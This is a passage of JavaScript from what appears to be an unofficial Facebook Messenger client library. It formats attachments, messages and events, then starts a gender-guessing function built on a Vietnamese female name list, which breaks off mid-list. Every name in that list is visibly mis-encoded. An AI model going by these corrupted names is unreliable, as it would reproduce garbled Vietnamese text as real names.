blob.large_image.height,\n\n                url: blob.playable_url,\n                width: blob.original_dimensions.x,\n                height: blob.original_dimensions.y,\n\n                duration: blob.playable_duration_in_ms,\n                videoType: blob.video_type.toLowerCase(),\n\n                thumbnailUrl: blob.large_image.uri // @Legacy\n            };\n        case \"MessageAudio\":\n            return {\n                type: \"audio\",\n                filename: blob.filename,\n                ID: blob.url_shimhash,\n\n                audioType: blob.audio_type,\n                duration: blob.playable_duration_in_ms,\n                url: blob.playable_url,\n\n                isVoiceMail: blob.is_voicemail\n            };\n        case \"StickerAttachment\":\n            return {\n                type: \"sticker\",\n                ID: blob.id,\n                url: blob.url,\n\n                packID: blob.pack ? blob.pack.id : null,\n                spriteUrl: blob.sprite_image,\n                spriteUrl2x: blob.sprite_image_2x,\n                width: blob.width,\n                height: blob.height,\n\n                caption: blob.label,\n                description: blob.label,\n\n                frameCount: blob.frame_count,\n                frameRate: blob.frame_rate,\n                framesPerRow: blob.frames_per_row,\n                framesPerCol: blob.frames_per_column,\n\n                stickerID: blob.id, // @Legacy\n                spriteURI: blob.sprite_image, // @Legacy\n                spriteURI2x: blob.sprite_image_2x // @Legacy\n            };\n        case \"MessageLocation\":\n            var urlAttach = blob.story_attachment.url;\n            var mediaAttach = blob.story_attachment.media;\n\n            var u = querystring.parse(url.parse(urlAttach).query).u;\n            var where1 = querystring.parse(url.parse(u).query).where1;\n            var address = where1.split(\", \");\n\n            var latitude;\n            var longitude;\n\n            try {\n                latitude = Number.parseFloat(address[0]);\n                longitude = Number.parseFloat(address[1]);\n            } catch (err) {\n                /* empty */\n\n            }\n\n            var imageUrl;\n            var width;\n            var height;\n\n            if (mediaAttach && mediaAttach.image) {\n                imageUrl = mediaAttach.image.uri;\n                width = mediaAttach.image.width;\n                height = mediaAttach.image.height;\n            }\n\n            return {\n                type: \"location\",\n                ID: blob.legacy_attachment_id,\n                latitude: latitude,\n                longitude: longitude,\n                image: imageUrl,\n                width: width,\n                height: height,\n                url: u || urlAttach,\n                address: where1,\n\n                facebookUrl: blob.story_attachment.url, // @Legacy\n                target: blob.story_attachment.target, // @Legacy\n                styleList: blob.story_attachment.style_list // @Legacy\n            };\n        case \"ExtensibleAttachment\":\n            return {\n                type: \"share\",\n                ID: blob.legacy_attachment_id,\n                url: blob.story_attachment.url,\n\n                title: blob.story_attachment.title_with_entities.text,\n                description: blob.story_attachment.description &&\n                    blob.story_attachment.description.text,\n                source: blob.story_attachment.source ? blob.story_attachment.source.text : null,\n\n                image: blob.story_attachment.media &&\n                    blob.story_attachment.media.image &&\n                    blob.story_attachment.media.image.uri,\n                width: blob.story_attachment.media &&\n                    blob.story_attachment.media.image &&\n                    blob.story_attachment.media.image.width,\n                height: blob.story_attachment.media &&\n                    blob.story_attachment.media.image &&\n                    blob.story_attachment.media.image.height,\n                playable: blob.story_attachment.media &&\n                    blob.story_attachment.media.is_playable,\n                duration: blob.story_attachment.media &&\n                    blob.story_attachment.media.playable_duration_in_ms,\n                playableUrl: blob.story_attachment.media == null ? null : blob.story_attachment.media.playable_url,\n\n                subattachments: blob.story_attachment.subattachments,\n                properties: blob.story_attachment.properties.reduce(function(/** @type {{ [x: string]: any; }} */obj, /** @type {{ key: string | number; value: { text: any; }; }} */cur) {\n                    obj[cur.key] = cur.value.text;\n                    return obj;\n                }, {}),\n\n                facebookUrl: blob.story_attachment.url, // @Legacy\n                target: blob.story_attachment.target, // @Legacy\n                styleList: blob.story_attachment.style_list // @Legacy\n            };\n        case \"MessageFile\":\n            return {\n                type: \"file\",\n                filename: blob.filename,\n                ID: blob.message_file_fbid,\n\n                url: blob.url,\n                isMalicious: blob.is_malicious,\n                contentType: blob.content_type,\n\n                name: blob.filename,\n                mimeType: \"\",\n                fileSize: -1\n            };\n        default:\n            throw new Error(\n                \"unrecognized attach_file of type \" +\n                type +\n                \"`\" +\n                JSON.stringify(attachment1, null, 4) +\n                \" attachment2: \" +\n                JSON.stringify(attachment2, null, 4) +\n                \"`\"\n            );\n    }\n}\n\n/**\n * @param {any[]} attachments\n * @param {{ [x: string]: string | number; }} attachmentIds\n * @param {{ [x: string]: any; }} attachmentMap\n * @param {any} shareMap\n */\n\nfunction formatAttachment(attachments, attachmentIds, attachmentMap, shareMap) {\n    attachmentMap = shareMap || attachmentMap;\n    return attachments ?\n        attachments.map(function(/** @type {any} */val, /** @type {string | number} */i) {\n            if (!attachmentMap ||\n                !attachmentIds ||\n                !attachmentMap[attachmentIds[i]]\n            ) {\n                return _formatAttachment(val);\n            }\n            return _formatAttachment(val, attachmentMap[attachmentIds[i]]);\n        }) : [];\n}\n\n/**\n * @param {{ delta: { messageMetadata: any; data: { prng: string; }; body: string; attachments: any; participants: any; }; }} m\n */\n\nfunction formatDeltaMessage(m) {\n    var md = m.messageMetadata;\n    var mdata =\n        m.data === undefined ? [] :\n        m.data.prng === undefined ? [] :\n        JSON.parse(m.data.prng);\n    var m_id = mdata.map((/** @type {{ i: any; }} */u) => u.i);\n    var m_offset = mdata.map((/** @type {{ o: any; }} */u) => u.o);\n    var m_length = mdata.map((/** @type {{ l: any; }} */u) => u.l);\n    var mentions = {};\n    var body = m.body || \"\";\n    var args = body == \"\" ? [] : body.trim().split(/\\s+/);\n    for (var i = 0; i < m_id.length; i++) mentions[m_id[i]] = m.body.substring(m_offset[i], m_offset[i] + m_length[i]);\n\n    return {\n        type: \"message\",\n        senderID: formatID(md.actorFbId.toString()),\n        threadID: formatID((md.threadKey.threadFbId || md.threadKey.otherUserFbId).toString()),\n        messageID: md.messageId,\n        args: args,\n        body: body,\n        attachments: (m.attachments || []).map((/** @type {any} */v) => _formatAttachment(v)),\n        mentions: mentions,\n        timestamp: md.timestamp,\n        isGroup: !!md.threadKey.threadFbId,\n        participantIDs: m.participants || []\n    };\n}\n\n/**\n * @param {string} id\n */\n\nfunction formatID(id) {\n    if (id != undefined && id != null) return id.replace(/(fb)?id[:.]/, \"\");\n    else return id;\n}\n\n/**\n * @param {{ message: any; type: string; realtime_viewer_fbid: { toString: () => any; }; }} m\n */\n\nfunction formatMessage(m) {\n    var originalMessage = m.message ? m.message : m;\n    var obj = {\n        type: \"message\",\n        senderName: originalMessage.sender_name,\n        senderID: formatID(originalMessage.sender_fbid.toString()),\n        participantNames: originalMessage.group_thread_info ? originalMessage.group_thread_info.participant_names : [originalMessage.sender_name.split(\" \")[0]],\n        participantIDs: originalMessage.group_thread_info ?\n            originalMessage.group_thread_info.participant_ids.map(function(/** @type {{ toString: () => any; }} */v) {\n                return formatID(v.toString());\n            }) : [formatID(originalMessage.sender_fbid)],\n        body: originalMessage.body || \"\",\n        threadID: formatID((originalMessage.thread_fbid || originalMessage.other_user_fbid).toString()),\n        threadName: originalMessage.group_thread_info ? originalMessage.group_thread_info.name : originalMessage.sender_name,\n        location: originalMessage.coordinates ? originalMessage.coordinates : null,\n        messageID: originalMessage.mid ? originalMessage.mid.toString() : originalMessage.message_id,\n        attachments: formatAttachment(\n            originalMessage.attachments,\n            originalMessage.attachmentIds,\n            originalMessage.attachment_map,\n            originalMessage.share_map\n        ),\n        timestamp: originalMessage.timestamp,\n        timestampAbsolute: originalMessage.timestamp_absolute,\n        timestampRelative: originalMessage.timestamp_relative,\n        timestampDatetime: originalMessage.timestamp_datetime,\n        tags: originalMessage.tags,\n        reactions: originalMessage.reactions ? originalMessage.reactions : [],\n        isUnread: originalMessage.is_unread \n    };\n\n    if (m.type === \"pages_messaging\") obj.pageID = m.realtime_viewer_fbid.toString();\n    obj.isGroup = obj.participantIDs.length > 2;\n\n    return obj;\n}\n\n/**\n * @param {{ message: any; }} m\n */\n\nfunction formatEvent(m) {\n    var originalMessage = m.message ? m.message : m;\n    var logMessageType = originalMessage.log_message_type;\n    var logMessageData;\n    if (logMessageType === \"log:generic-admin-text\") {\n        logMessageData = originalMessage.log_message_data.untypedData;\n        logMessageType = getAdminTextMessageType(originalMessage.log_message_data.message_type);\n    } else logMessageData = originalMessage.log_message_data;\n\n    return Object.assign(formatMessage(originalMessage), {\n        type: \"event\",\n        logMessageType: logMessageType,\n        logMessageData: logMessageData,\n        logMessageBody: originalMessage.log_message_body\n    });\n}\n\n/**\n * @param {{ action_type: any; }} m\n */\n\nfunction formatHistoryMessage(m) {\n    switch (m.action_type) {\n        case \"ma-type:log-message\":\n            return formatEvent(m);\n        default:\n            return formatMessage(m);\n    }\n}\n\n// Get a more readable message type for AdminTextMessages\n/**\n * @param {{ type: any; }} m\n */\n\nfunction getAdminTextMessageType(m) {\n    switch (m.type) {\n        case \"joinable_group_link_mode_change\":\n            return \"log:link-status\";\n        case \"magic_words\":\n            return \"log:magic-words\";\n        case \"change_thread_theme\":\n            return \"log:thread-color\";\n        case \"change_thread_icon\":\n            return \"log:thread-icon\";\n        case \"change_thread_nickname\":\n            return \"log:user-nickname\";\n        case \"change_thread_admins\":\n            return \"log:thread-admins\";\n        case \"group_poll\":\n            return \"log:thread-poll\";\n        case \"change_thread_approval_mode\":\n            return \"log:thread-approval-mode\";\n        case \"messenger_call_log\":\n        case \"participant_joined_group_call\":\n            return \"log:thread-call\";\n        case \"pin_messages_v2\":\n            return \"log:thread-pinned\";\n    }\n}\n\n/**\n * @param {string} name\n */\n\nfunction getGenderByPhysicalMethod(name) {\n  const female_name = [\n    \"Ph∆∞∆°ng Chi\",\n    \"An B√¨nh\",\n    \"An Di\",\n    \"An H·∫°\",\n    \"An H·∫±ng\",\n    \"An Kh√™\",\n    \"An Nhi√™n\",\n    \"An Nh√†n\",\n    \"Anh Chi\",\n    \"Anh H∆∞∆°ng\",\n    \"Anh Mai\",\n    \"Anh Ph∆∞∆°ng\",\n    \"Anh Thi\",\n    \"Anh Thy\",\n    \"Anh Th∆°\",\n    \"Anh Th∆∞\",\n    \"Anh Th·∫£o\",\n    \"Anh V≈©\",\n    \"Anh √ê√†o\",\n    \"Ban Mai\",\n    \"B√¨nh Minh\",\n    \"B√¨nh Y√™n\",\n    \"B√≠ch Chi√™u\",\n    \"B√≠ch Ch√¢u\",\n    \"B√≠ch Duy√™n\",\n    \"B√≠ch Hi·ªÅn\",\n    \"B√≠ch Hu·ªá\",\n    \"B√≠ch H√†\",\n    \"B√≠ch H·∫°nh\",\n    \"B√≠ch H·∫£i\",\n    \"B√≠ch H·∫£o\",\n    \"B√≠ch H·∫≠u\",\n    \"B√≠ch H·∫±ng\",\n    \"B√≠ch H·ªìng\",\n    \"B√≠ch H·ª£p\",\n    \"B√≠ch Lam\",\n    \"B√≠ch Li√™n\",\n    \"B√≠ch Loan\",\n    \"B√≠ch Nga\",\n    \"B√≠ch Ng√†\",\n    \"B√≠ch Ng√¢n\",\n    \"B√≠ch Ng·ªçc\",\n    \"B√≠ch Nh∆∞\",\n    \"B√≠ch Ph∆∞·ª£ng\",\n    \"B√≠ch Quy√™n\",\n    \"B√≠ch Qu√¢n\",\n    \"B√≠ch San\",\n    \"B√≠ch Thoa\",\n    \"B√≠ch Thu\",\n    \"B√≠ch Th·∫£o\",\n    \"B√≠ch Th·ªßy\",\n    \"B√≠ch Trang\",\n    \"B√≠ch Tr√¢m\",\n    \"B√≠ch Ty\",\n    \"B√≠ch V√¢n\",\n    \"B√≠ch √êi·ªáp\",\n    \"B√≠ch √ê√†o\",\n    \"BƒÉng BƒÉng\",\n    \"BƒÉng T√¢m\",\n    \"B·∫°ch C√∫c\",\n    \"B·∫°ch Hoa\",\n    \"B·∫°ch Kim\",\n    \"B·∫°ch Li√™n\",\n    \"B·∫°ch Loan\",\n    \"B·∫°ch Mai\",\n    \"B·∫°ch Qu·ª≥nh\",\n    \"B·∫°ch Tr√†\",\n    \"B·∫°ch Tuy·∫øt\",\n    \"B·∫°ch V√¢n\",\n    \"B·∫°ch Y·∫øn\",\n    \"B·∫£o Anh\",\n    \"B·∫£o B√¨nh\",\n    \"B·∫£o Ch√¢u\",\n    \"B·∫£o Hu·ªá\",\n    \"B·∫£o H√†\",\n    \"B·∫£o H√¢n\",\n    \"B·∫£o Lan\",\n    \"B·∫£o L·ªÖ\",\n    \"B·∫£o Ng·ªçc\",\n    \"B·∫£o Ph∆∞∆°ng\",\n    \"B·∫£o Quy√™n\",\n    \"B·∫£o Qu·ª≥nh\",\n    \"B·∫£o Thoa\",\n    \"B·∫£o Th√∫y\",\n    \"B·∫£o Ti√™n\",\n    \"B·∫£o Tr√¢m\",\n    \"B·∫£o Tr√¢n\",\n    \"B·∫£o Tr√∫c\",\n    \"B·∫£o Uy√™n\",\n    \"B·∫£o Vy\",\n    \"B·∫£o V√¢n\",\n    \"B·ªôi Linh\",\n    \"Cam Th·∫£o\",\n    \"Chi Lan\",\n    \"Chi Mai\",\n    \"Chi√™u D∆∞∆°ng\",\n    \"C√°t C√°t\",\n    \"C√°t Linh\",\n    \"C√°t Ly\",\n    \"C√°t Ti√™n\",\n    \"C√°t T∆∞·ªùng\",\n    \"C·∫©m Hi·ªÅn\",\n    \"C·∫©m H∆∞·ªùng\",\n    \"C·∫©m H·∫°nh\",\n    \"C·∫©m Linh\",\n    \"C·∫©m Li√™n\",\n    \"C·∫©m Ly\",\n    \"C·∫©m Nhi\",\n    \"C·∫©m Nhung\",\n    \"C·∫©m Th√∫y\",\n    \"C·∫©m T√∫\",\n    \"C·∫©m V√¢n\",\n    \"C·∫©m Y·∫øn\",\n    \"Di Nhi√™n\",\n    \"Di√™n V·ªπ\",\n    \"Di·ªÖm Chi\",\n    \"Di·ªÖm Ch√¢u\",\n    \"Di·ªÖm H∆∞∆°ng\",\n    \"Di·ªÖm H·∫°nh\",\n    \"Di·ªÖm H·∫±ng\",\n    \"Di·ªÖm Khu√™\",\n    \"Di·ªÖm Ki·ªÅu\",\n    \"Di·ªÖm Li√™n\",\n    \"Di·ªÖm L·ªôc\",\n    \"Di·ªÖm My\",\n    \"Di·ªÖm Ph√∫c\",\n    \"Di·ªÖm Ph∆∞∆°ng\",\n    \"Di·ªÖm Ph∆∞·ªõc\",\n    \"Di·ªÖm Ph∆∞·ª£ng\",\n    \"Di·ªÖm Quy√™n\",\n    \"Di·ªÖm Qu·ª≥nh\",\n    \"Di·ªÖm Th√∫y\",\n    \"Di·ªÖm Th∆∞\",\n    \"Di·ªÖm Th·∫£o\",\n    \"Di·ªÖm Trang\",\n    \"Di·ªÖm Trinh\",\n    \"Di·ªÖm Uy√™n\",\n    \"Di·ªáp Anh\",\n    \"Di·ªáp Vy\",\n    \"Di·ªáu Anh\",\n    \"Di·ªáu Hi·ªÅn\",\n    \"Di·ªáu Hoa\",\n    \"Di·ªáu Huy·ªÅn\",\n    \"Di·ªáu H∆∞∆°ng\",\n    \"Di·ªáu H·∫°nh\",\n    \"Di·ªáu H·∫±ng\",\n    \"Di·ªáu H·ªìng\",\n    \"Di·ªáu Lan\",\n    \"Di·ªáu Linh\",\n    \"Di·ªáu Loan\",\n    \"Di·ªáu Nga\",\n    \"Di·ªáu Ng√†\",\n    \"Di·ªáu Ng·ªçc\",\n    \"Di·ªáu N∆∞∆°ng\",\n    \"Di·ªáu Thi·ªán\",\n    \"Di·ªáu Th√∫y\",\n    \"Di·ªáu V√¢n\",\n    \"Di·ªáu √Åi\",\n    \"Duy H·∫°nh\",\n    \"Duy M·ªπ\",\n    \"Duy Uy√™n\",\n    \"Duy√™n H·ªìng\",\n    \"Duy√™n My\",\n    \"Duy√™n M·ªπ\",\n    \"Duy√™n N∆∞∆°ng\",\n    \"D√£ Lan\",\n    \"D√£ L√¢m\",\n    \"D√£ Th·∫£o\",\n    \"D·∫° H∆∞∆°ng\",\n    \"D·∫° Lan\",\n    \"D·∫° Nguy·ªát\",\n    \"D·∫° Thi\",\n    \"D·∫° Th·∫£o\",\n    \"D·∫° Y·∫øn\",\n    \"Gia H√¢n\",\n    \"Gia Khanh\",\n    \"Gia Linh\",\n    \"Gia Nhi\",\n    \"Gia Qu·ª≥nh\",\n    \"Giang Thanh\",\n    \"Giang Thi√™n\",\n    \"Giao H∆∞·ªüng\",\n    \"Giao Ki·ªÅu\",\n    \"Giao Linh\",\n    \"Gi√°ng Ng·ªçc\",\n    \"Gi√°ng Ti√™n\",\n    \"Gi√°ng Uy√™n\",\n    \"Hi·∫øu Giang\",\n    \"Hi·∫øu H·∫°nh\",\n    \"Hi·∫øu Khanh\",\n    \"Hi·∫øu Minh\",\n    \"Hi·ªÅn Chung\",\n    \"Hi·ªÅn H√≤a\",\n    \"Hi·ªÅn Mai\",\n    \"Hi·ªÅn Nhi\",\n    \"Hi·ªÅn N∆∞∆°ng\",\n    \"Hi·ªÅn Th·ª•c\",\n    \"Hi·ªÉu Lam\",\n    \"Hi·ªÉu V√¢n\",\n    \"Hoa Li√™n\",\n    \"Hoa L√Ω\",\n    \"Hoa Thi√™n\",\n    \"Hoa Ti√™n\",\n    \"Hoa Tranh\",\n    \"Ho√†i An\",\n    \"Ho√†i Giang\",\n    \"Ho√†i H∆∞∆°ng\",\n    \"Ho√†i Ph∆∞∆°ng\",\n    \"Ho√†i Th∆∞∆°ng\",\n    \"Ho√†i Trang\",\n    \"Ho√†i V·ªπ\",\n    \"Ho√†n Ch√¢u\",\n    \"Ho√†n Vi\",\n    \"Ho√†ng C√∫c\",\n    \"Ho√†ng H√†\",\n    \"Ho√†ng Kim\",\n    \"Ho√†ng Lan\",\n    \"Ho√†ng Mai\",\n    \"Ho√†ng Mi√™n\",\n    \"Ho√†ng Nguy√™n\",\n    \"Ho√†ng Oanh\",\n    \"Ho√†ng Sa\",\n    \"Ho√†ng Th∆∞\",\n    \"Ho√†ng Xu√¢n\",\n    \"Ho√†ng Y·∫øn\",\n    \"Ho·∫° Mi\",\n    \"Huy·ªÅn Anh\",\n    \"Huy·ªÅn Di·ªáu\",\n    \"Huy·ªÅn Linh\",\n    \"Huy·ªÅn Ng·ªçc\",\n    \"Huy·ªÅn Nhi\",\n    \"Huy·ªÅn Tho·∫°i\",\n    \"Huy·ªÅn Th∆∞\",\n    \"Huy·ªÅn Trang\",\n    \"Huy·ªÅn Tr√¢m\",\n    \"Huy·ªÅn Tr√¢n\",\n    \"Hu·ªá An\",\n    \"Hu·ªá H∆∞∆°ng\",\n    \"Hu·ªá H·ªìng\",\n    \"Hu·ªá Lan\",\n    \"Hu·ªá Linh\",\n    \"Hu·ªá L√¢m\",\n    \"Hu·ªá My\",\n    \"Hu·ªá Ph∆∞∆°ng\",\n    \"Hu·ªá Th∆∞∆°ng\",\n    \"Hu·ªá √Çn\",\n    \"Hu·ª≥nh Anh\",\n    \"H√† Giang\",\n    \"H√† Li√™n\",\n    \"H√† Mi\",\n    \"H√† My\",\n    \"H√† Nhi\",\n    \"H√† Ph∆∞∆°ng\",\n    \"H√† Thanh\",\n    \"H√† Ti√™n\",\n    \"H√†m Duy√™n\",\n    \"H√†m Nghi\",\n    \"H√†m Th∆°\",\n    \"H√†m √ù\",\n    \"H∆∞∆°ng Chi\",\n    \"H∆∞∆°ng Giang\",\n    \"H∆∞∆°ng Lan\",\n    \"H∆∞∆°ng Li√™n\",\n    \"H∆∞∆°ng Ly\",\n    \"H∆∞∆°ng L√¢m\",\n    \"H∆∞∆°ng Mai\",\n    \"H∆∞∆°ng Nhi\",\n    \"H∆∞∆°ng Thu\",\n    \"H∆∞∆°ng Th·∫£o\",\n    \"H∆∞∆°ng Th·ªßy\",\n    \"H∆∞∆°ng Ti√™n\",\n    \"H∆∞∆°ng Trang\",\n    \"H∆∞∆°ng Tr√†\",\n    \"H∆∞∆°ng Xu√¢n\",\n    \"H∆∞·ªõng D∆∞∆°ng\",\n    \"H·∫° BƒÉng\",\n    \"H·∫° Giang\",\n    \"H·∫° Ph∆∞∆°ng\",\n    \"H·∫° Ti√™n\",\n    \"H·∫° Uy√™n\",\n    \"H·∫° Vy\",\n    \"H·∫°c C√∫c\",\n    \"H·∫°nh Chi\",\n    \"H·∫°nh Dung\",\n    \"H·∫°nh Linh\",\n    \"H·∫°nh My\",\n    \"H·∫°nh Nga\",\n    \"H·∫°nh Nh∆°n\",\n    \"H·∫°nh Ph∆∞∆°ng\",\n    \"H·∫°nh San\",\n    \"H·∫°nh Th·∫£o\",\n    \"H·∫°nh Trang\",\n    \"H·∫°nh Vi\",\n    \"H·∫£i Anh\",\n    \"H·∫£i Ch√¢u\",\n    \"H·∫£i Duy√™n\",\n    \"H·∫£i D∆∞∆°ng\",\n    \"H·∫£i Mi√™n\",\n    \"H·∫£i My\",\n    \"H·∫£i M·ªπ\",\n    \"H·∫£i Ng√¢n\",\n    \"H·∫£i Nhi\",\n    \"H·∫£i Ph∆∞∆°ng\",\n    \"H·∫£i Ph∆∞·ª£ng\",\n    \"H·∫£i San\",\n    \"H·∫£i Sinh\",\n    \"H·∫£i Thanh\",\n    \"H·∫£i Th·∫£o\",\n    \"H·∫£i Th·ª•y\",\n    \"H·∫£i Uy√™n\",\n    \"H·∫£i Vy\",\n    \"H·∫£i V√¢n\",\n    \"H·∫£i Y·∫øn\",\n    \"H·∫£i √Çn\",\n    \"H·∫£i √ê∆∞·ªùng\",\n    \"H·∫£o Nhi\",\n    \"H·∫±ng Anh\",\n    \"H·∫±ng Nga\",\n    \"H·ªça Mi\",\n    \"H·ªì Di·ªáp\",\n    \"H·ªìng Anh\",\n    \"H·ªìng B·∫°ch Th·∫£o\",\n    \"H·ªìng Ch√¢u\",\n    \"H·ªìng Di·ªÖm\",\n    \"H·ªìng Giang\",\n    \"H·ªìng Hoa\",\n    \"H·ªìng H√†\",\n    \"H·ªìng H·∫°nh\",\n    \"H·ªìng Khanh\",\n    \"H·ªìng Khu√™\",\n    \"H·ªìng Kh√¥i\",\n    \"H·ªìng Linh\",\n    \"H·ªìng Li√™n\",\n    \"H·ªìng L√¢m\",\n    \"H·ªìng Mai\",\n    \"H·ªìng Nga\",\n    \"H·ªìng Ng√¢n\",\n    \"H·ªìng Ng·ªçc\",\n    \"H·ªìng Nhung\",\n    \"H·ªìng Nh∆∞\",\n    \"H·ªìng Nh·∫°n\",\n    \"H·ªìng Oanh\",\n    \"H·ªìng Ph√∫c\",\n    \"H·ªìng Ph∆∞∆°ng\",\n    \"H·ªìng Qu·∫ø\",\n    \"H·ªìng Thu\",\n    \"H·ªìng Th√∫y\",\n    \"H·ªìng Th∆∞\",\n    \"H·ªìng Th·∫£o\",\n    \"H·ªìng Th·∫Øm\",\n    \"H·ªìng Th·ªßy\",\n    \"H·ªìng Tr√∫c\",\n    \"H·ªìng T√¢m\",\n    \"H·ªìng V√¢n\",\n    \"H·ªìng Xu√¢n\",\n    \"H·ªìng √êi·ªáp\",\n    \"H·ªìng √ê√†o\",\n    \"H·ªìng ƒêƒÉng\",\n    \"Khi·∫øt Linh\",\n    \"Khi·∫øt T√¢m\",\n    \"Khu√™ Trung\",\n    \"Kh√°nh Chi\",\n    \"Kh√°nh Giang\",\n    \"Kh√°nh Giao\",\n    \"Kh√°nh Huy·ªÅn\",\n    \"Kh√°nh H√†\",\n    \"Kh√°nh H·∫±ng\",\n    \"Kh√°nh Linh\",\n    \"Kh√°nh Ly\",\n    \"Kh√°nh Mai\",\n    \"Kh√°nh My\",\n    \"Kh√°nh Ng√¢n\",\n    \"Kh√°nh Ng·ªçc\",\n    \"Kh√°nh Quy√™n\",\n    \"Kh√°nh Qu·ª≥nh\",\n    \"Kh√°nh Th·ªßy\",\n    \"Kh√°nh Trang\",\n    \"Kh√°nh Vi\",\n    \"Kh√°nh Vy\",\n    \"Kh√°nh V√¢n\",\n    \"Kh√∫c Lan\",\n    \"Kh·∫£ Khanh\",\n    \"Kh·∫£ T√∫\",\n    \"Kh·∫£ √Åi\",\n    \"Kh·∫£i Ca\",\n    \"Kh·∫£i H√†\",\n    \"Kh·∫£i T√¢m\",\n    \"Kim Anh\",\n    \"Kim Chi\",\n    \"Kim C∆∞∆°ng\",\n    \"Kim Dung\",\n    \"Kim Duy√™n\",\n    \"Kim Hoa\",\n    \"Kim H∆∞∆°ng\",\n    \"Kim Khanh\",\n    \"Kim Khuy√™n\",\n    \"Kim Kh√°nh\",\n    \"Kim Lan\",\n    \"Kim Li√™n\",\n    \"Kim Loan\",\n    \"Kim Ly\",\n    \"Kim Mai\",\n    \"Kim Ng√¢n\",\n    \"Kim Ng·ªçc\",\n    \"Kim Oanh\",\n    \"Kim Ph∆∞·ª£ng\",\n    \"Kim Quy√™n\",\n    \"Kim Sa\",\n    \"Kim Thanh\",\n    \"Kim Thoa\",\n    \"Kim Thu\",\n    \"Kim Thy\",\n    \"Kim Th√¥ng\",\n    \"Kim Th∆∞\",\n    \"Kim Th·∫£o\",\n    \"Kim Th·ªßy\",\n    \"Kim Trang\",\n    \"Kim Tuy·∫øn\",\n    \"Kim Tuy·∫øt\",\n    \"Kim Tuy·ªÅn\",\n    \"Kim Xuy·∫øn\",\n    \"Kim Xu√¢n\",\n    \"Kim Y·∫øn\",\n    \"Kim √Ånh\",\n    \"Kim ƒêan\",\n    \"Ki·∫øt H·ªìng\",\n    \"Ki·∫øt Trinh\",\n    \"Ki·ªÅu Anh\",\n    \"Ki·ªÅu Di·ªÖm\",\n    \"Ki·ªÅu Dung\",\n    \"Ki·ªÅu Giang\",\n    \"Ki·ªÅu Hoa\",\n    \"Ki·ªÅu H·∫°nh\",\n    \"Ki·ªÅu Khanh\",\n    \"Ki·ªÅu Loan\",\n    \"Ki·ªÅu Mai\",\n    \"Ki·ªÅu Minh\",\n    \"Ki·ªÅu M·ªπ\",\n    \"Ki·ªÅu Nga\",\n    \"Ki·ªÅu Nguy·ªát\",\n    \"Ki·ªÅu N∆∞∆°ng\",\n    \"Ki·ªÅu Thu\",\n    \"Ki·ªÅu Trang\",\n    \"Ki·ªÅu Trinh\",\n    \"K·ª≥ Anh\",\n    \"K·ª≥ Di·ªáu\",\n    \"K·ª≥ Duy√™n\",\n    \"Lam Giang\",\n    \"Lam H√†\",\n    \"Lam Kh√™\",\n    \"Lam Ng·ªçc\",\n    \"Lam Tuy·ªÅn\",\n    \"Lan Anh\",\n    \"Lan Chi\",\n    \"Lan H∆∞∆°ng\",\n    \"Lan Khu√™\",\n    \"Lan Ng·ªçc\",\n    \"Lan Nhi\",\n    \"Lan Ph∆∞∆°ng\",\n    \"Lan Th∆∞∆°ng\",\n    \"Lan Tr√∫c\",\n    \"Lan Vy\",\n    \"Linh Chi\",\n    \"Linh Ch√¢u\",\n    \"Linh Duy√™n\",\n    \"Linh Giang\",\n    \"Linh H√†\",\n    \"Linh Lan\",\n    \"Linh Nhi\",\n    \"Linh Ph∆∞∆°ng\",\n    \"Linh Ph∆∞·ª£ng\",\n    \"Linh San\",\n    \"Linh Trang\",\n    \"Linh √êan\",\n    \"Li√™n Chi\",\n    \"Li√™n Hoa\",\n    \"Li√™n H∆∞∆°ng\",\n    \"Li√™n Nh∆∞\",\n    \"Li√™n Ph∆∞∆°ng\",\n    \"Li√™n Tr√¢n\",\n    \"Li·ªÖu Oanh\",\n    \"Loan Ch√¢u\",\n    \"Ly Ch√¢u\",\n    \"L√¢m Nhi\",\n    \"L√¢m Oanh\",\n    \"L√¢m Tuy·ªÅn\",\n    \"L√¢m Uy√™n\",\n    \"L√™ Qu·ª≥nh\",\n    \"L∆∞u Ly\",\n    \"L·ªá BƒÉng\",\n    \"L·ªá Chi\",\n    \"L·ªá Giang\",\n    \"L·ªá Hoa\",\n    \"L·ªá Huy·ªÅn\",\n    \"L·ªá Khanh\",\n    \"L·ªá Nga\",\n    \"L·ªá Nhi\",\n    \"L·ªá Quy√™n\",\n    \"L·ªá Qu√¢n\",\n    \"L·ªá Thanh\",\n    \"L·ªá Thu\",\n    \"L·ªá Th·ªßy\",\n    \"L·ªôc Uy√™n\",\n    \"L·ªôc Uy·ªÉn\",\n    \"L·ª•c B√¨nh\",\n    \"Mai Anh\",\n    \"Mai Chi\",\n    \"Mai Ch√¢u\",\n    \"Mai Hi·ªÅn\",\n    \"Mai H√†\",\n    \"Mai H∆∞∆°ng\",\n    \"Mai H·∫°\",\n    \"Mai Khanh\",\n    \"Mai Kh√¥i\",\n    \"Mai Lan\",\n    \"Mai Linh\",\n    \"Mai Li√™n\",\n    \"Mai Loan\",\n    \"Mai Ly\",\n    \"Mai Nhi\",\n    \"Mai Ph∆∞∆°ng\",\n    \"Mai Quy√™n\",\n    \"Mai Thanh\",\n    \"Mai Thu\",\n    \"Mai Thy\",\n    \"Mai Th·∫£o\",\n    \"Mai Trinh\",\n    \"Mai T√¢m\",\n    \"Mai Vy\",\n    \"Minh An\",\n    \"Minh Ch√¢u\",\n    \"Minh Duy√™n\",\n    \"Minh Hi·ªÅn\",\n    \"Minh Huy·ªÅn\",\n    \"Minh Hu·ªá\",\n    \"Minh H√†\",\n    \"Minh H∆∞∆°ng\",\n    \"Minh H·∫°nh\",\n    \"Minh H·∫±ng\",\n    \"Minh H·ªìng\",\n    \"Minh Khai\",\n    \"Minh Khu√™\",\n    \"Minh Loan\",\n    \"Minh Minh\",\n    \"Minh Nguy·ªát\",\n    \"Minh Ng·ªçc\",\n    \"Minh Nhi\",\n    \"Minh Nh∆∞\",\n    \"Minh Ph∆∞∆°ng\",\n    \"Minh Ph∆∞·ª£ng\",\n    \"Minh Thu\",\n    \"Minh Th√∫y\",\n    \"Minh Th∆∞\",\n    \"Minh Th∆∞∆°ng\",\n    \"Minh Th·∫£o\",\n    \"Minh Th·ªßy\",\n    \"Minh Trang\",\n    \"Minh Tuy·∫øt\",\n    \"Minh Tu·ªá\",\n    \"Minh T√¢m\",\n    \"Minh Uy√™n\",\n    \"Minh Vy\",\n    \"Minh Xu√¢n\",\n    \"Minh Y·∫øn\",\n    \"Minh ƒêan\",\n    \"M·∫≠u Xu√¢n\",\n    \"M·ªôc Mi√™n\",\n    \"M·ªông Hoa\",\n    \"M·ªông H∆∞∆°ng\",\n    